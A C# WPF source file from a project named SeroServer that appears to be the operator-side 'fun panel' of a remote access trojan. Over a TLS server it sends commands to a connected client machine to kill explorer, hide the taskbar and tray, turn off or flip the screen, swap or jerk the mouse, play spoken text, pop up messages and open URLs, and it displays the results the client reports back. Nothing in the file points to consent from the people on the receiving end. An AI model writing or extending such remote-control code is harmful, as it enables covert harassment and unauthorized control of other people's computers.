using System.Windows;
using System.Windows.Input;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class FunWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;

    // Tag="on" → active (blue accent), Tag="off" → dimmed inactive, null → unknown/reset
    private static void Activate(System.Windows.Controls.Button active, params System.Windows.Controls.Button[] others)
    {
        active.Tag = "on";
        foreach (var b in others) b.Tag = "off";
    }

    public FunWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.FunResult, pkt =>
        {
            try
            {
                var r = JsonConvert.DeserializeObject<FunResultData>(pkt.Data);
                Dispatcher.BeginInvoke(() =>
                {
                    if (r == null) { TxtStatus.Text = "No response from client."; return; }
                    TxtStatus.Text = $"{r.Action}: {r.Result}";
                });
            }
            catch { }
        });
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.FunResult);
            Lang.LanguageChanged -= ApplyLanguage;
        };
    }

    private void ApplyLanguage()
    {
        this.Title = Lang.Get("FEAT_FUN_PANEL");
        if (BtnCdEject          != null) BtnCdEject.Content          = Lang.Get("ACT_EJECT");
        if (BtnCdClose          != null) BtnCdClose.Content          = Lang.Get("ACT_CLOSE");
        if (BtnTaskbarShow      != null) BtnTaskbarShow.Content      = Lang.Get("ACT_SHOW");
        if (BtnTaskbarHide      != null) BtnTaskbarHide.Content      = Lang.Get("ACT_HIDE");
        if (BtnExplorerKill     != null) BtnExplorerKill.Content     = Lang.Get("ACT_KILL_SHORT");
        if (BtnExplorerStart    != null) BtnExplorerStart.Content    = Lang.Get("ACT_START");
        if (BtnScreenOn         != null) BtnScreenOn.Content         = Lang.Get("FUN_SCREEN_ON");
        if (BtnScreenOff        != null) BtnScreenOff.Content        = Lang.Get("FUN_SCREEN_OFF");
        if (BtnClockShow        != null) BtnClockShow.Content        = Lang.Get("FUN_CLOCK_SHOW");
        if (BtnClockHide        != null) BtnClockHide.Content        = Lang.Get("FUN_CLOCK_HIDE");
        if (BtnTrayShow         != null) BtnTrayShow.Content         = Lang.Get("FUN_TRAY_SHOW");
        if (BtnTrayHide         != null) BtnTrayHide.Content         = Lang.Get("FUN_TRAY_HIDE");
        if (BtnDesktopIconsShow != null) BtnDesktopIconsShow.Content = Lang.Get("ACT_SHOW");
        if (BtnDesktopIconsHide != null) BtnDesktopIconsHide.Content = Lang.Get("ACT_HIDE");
        if (BtnVolUp            != null) BtnVolUp.Content            = Lang.Get("FUN_VOL_UP");
        if (BtnVolDown          != null) BtnVolDown.Content          = Lang.Get("FUN_VOL_DOWN");
        if (BtnVolMute          != null) BtnVolMute.Content          = Lang.Get("FUN_MUTE");
        if (BtnMouseNormal      != null) BtnMouseNormal.Content      = Lang.Get("FUN_NORMAL");
        if (BtnMouseSwap        != null) BtnMouseSwap.Content        = Lang.Get("FUN_SWAP");
        if (BtnCrazyActivate    != null) BtnCrazyActivate.Content    = Lang.Get("ACT_ACTIVATE");
        if (BtnSpeak            != null) BtnSpeak.Content            = Lang.Get("ACT_SPEAK");
        if (BtnMsgShow          != null) BtnMsgShow.Content          = Lang.Get("ACT_SHOW");
        if (BtnOpenUrl          != null) BtnOpenUrl.Content          = Lang.Get("ACT_OPEN");
        if (LblFunTaskbar       != null) LblFunTaskbar.Text          = Lang.Get("FUN_LBL_TASKBAR");
        if (LblFunExplorer      != null) LblFunExplorer.Text         = Lang.Get("FUN_LBL_EXPLORER");
        if (LblFunScreen        != null) LblFunScreen.Text           = Lang.Get("FUN_LBL_SCREEN");
        if (LblFunClockTray     != null) LblFunClockTray.Text        = Lang.Get("FUN_LBL_CLOCK_TRAY");
        if (LblFunDesktop       != null) LblFunDesktop.Text          = Lang.Get("FUN_LBL_DESKTOP");
        if (LblFunVolume        != null) LblFunVolume.Text           = Lang.Get("FUN_LBL_VOLUME");
        if (LblFunMouse         != null) LblFunMouse.Text            = Lang.Get("FUN_LBL_MOUSE");
        if (LblFunScreenRot     != null) LblFunScreenRot.Text        = Lang.Get("FUN_LBL_SCREEN_ROT");
        if (LblFunCrazyMouse    != null) LblFunCrazyMouse.Text       = Lang.Get("FUN_LBL_CRAZY_MOUSE");
        if (LblFunTts           != null) LblFunTts.Text              = Lang.Get("FUN_LBL_TTS");
        if (LblFunMsgbox        != null) LblFunMsgbox.Text           = Lang.Get("FUN_LBL_MSGBOX");
        if (LblFunOpenUrl       != null) LblFunOpenUrl.Text          = Lang.Get("FUN_LBL_OPEN_URL");
        if (LblFunCdRom         != null) LblFunCdRom.Text            = Lang.Get("FUN_LBL_CD_ROM");
        if (LblFunSec           != null) LblFunSec.Text              = Lang.Get("FUN_LBL_SEC");
    }

    private async Task Send(string action, string param = "")
    {
        try
        {
            TxtStatus.Text = string.Format(Lang.Get("FUN_SENDING"), action);
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FunCmd,
                Data = JsonConvert.SerializeObject(new FunCmdData { Action = action, Param = param })
            });
        }
        catch { }
    }

    private async void CdOpen_Click(object s, RoutedEventArgs e)           => await Send("cd_open");
    private async void CdClose_Click(object s, RoutedEventArgs e)          => await Send("cd_close");

    private async void TaskbarShow_Click(object s, RoutedEventArgs e)
    { Activate(BtnTaskbarShow, BtnTaskbarHide); await Send("taskbar_show"); }
    private async void TaskbarHide_Click(object s, RoutedEventArgs e)
    { Activate(BtnTaskbarHide, BtnTaskbarShow); await Send("taskbar_hide"); }

    private async void ExplorerKill_Click(object s, RoutedEventArgs e)     => await Send("explorer_kill");
    private async void ExplorerStart_Click(object s, RoutedEventArgs e)    => await Send("explorer_start");

    private async void ScreenOn_Click(object s, RoutedEventArgs e)
    { Activate(BtnScreenOn, BtnScreenOff); await Send("screen_on"); }
    private async void ScreenOff_Click(object s, RoutedEventArgs e)
    { Activate(BtnScreenOff, BtnScreenOn); await Send("screen_off"); }

    private async void ClockShow_Click(object s, RoutedEventArgs e)
    { Activate(BtnClockShow, BtnClockHide); await Send("clock_show"); }
    private async void ClockHide_Click(object s, RoutedEventArgs e)
    { Activate(BtnClockHide, BtnClockShow); await Send("clock_hide"); }
    private async void TrayShow_Click(object s, RoutedEventArgs e)
    { Activate(BtnTrayShow, BtnTrayHide); await Send("tray_show"); }
    private async void TrayHide_Click(object s, RoutedEventArgs e)
    { Activate(BtnTrayHide, BtnTrayShow); await Send("tray_hide"); }

    private async void DesktopIconsShow_Click(object s, RoutedEventArgs e)
    { Activate(BtnDesktopIconsShow, BtnDesktopIconsHide); await Send("desktopicons_show"); }
    private async void DesktopIconsHide_Click(object s, RoutedEventArgs e)
    { Activate(BtnDesktopIconsHide, BtnDesktopIconsShow); await Send("desktopicons_hide"); }

    private async void MouseNormal_Click(object s, RoutedEventArgs e)
    { Activate(BtnMouseNormal, BtnMouseSwap); await Send("mouse_normal"); }
    private async void MouseSwap_Click(object s, RoutedEventArgs e)
    { Activate(BtnMouseSwap, BtnMouseNormal); await Send("mouse_swap"); }

    private async void VolUp_Click(object s, RoutedEventArgs e)            => await Send("volume_up");
    private async void VolDown_Click(object s, RoutedEventArgs e)          => await Send("volume_down");
    private async void VolMute_Click(object s, RoutedEventArgs e)          => await Send("volume_mute");

    private async void Flip0_Click(object s, RoutedEventArgs e)
    { Activate(BtnFlip0, BtnFlip90, BtnFlip180, BtnFlip270); await Send("flip_screen", "0"); }
    private async void Flip90_Click(object s, RoutedEventArgs e)
    { Activate(BtnFlip90, BtnFlip0, BtnFlip180, BtnFlip270); await Send("flip_screen", "90"); }
    private async void Flip180_Click(object s, RoutedEventArgs e)
    { Activate(BtnFlip180, BtnFlip0, BtnFlip90, BtnFlip270); await Send("flip_screen", "180"); }
    private async void Flip270_Click(object s, RoutedEventArgs e)
    { Activate(BtnFlip270, BtnFlip0, BtnFlip90, BtnFlip180); await Send("flip_screen", "270"); }

    private async void Speak_Click(object s, RoutedEventArgs e)
        => await Send("speak", TxtSpeak.Text);

    private async void MsgBox_Click(object s, RoutedEventArgs e)
        => await Send("msgbox", TxtMsgBox.Text);

    private async void CrazyMouse_Click(object s, RoutedEventArgs e)
        => await Send("crazy_mouse", TxtCrazyMouseSec.Text);

    private async void OpenUrl_Click(object s, RoutedEventArgs e)
        => await Send("open_url", TxtUrl.Text.Trim());

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
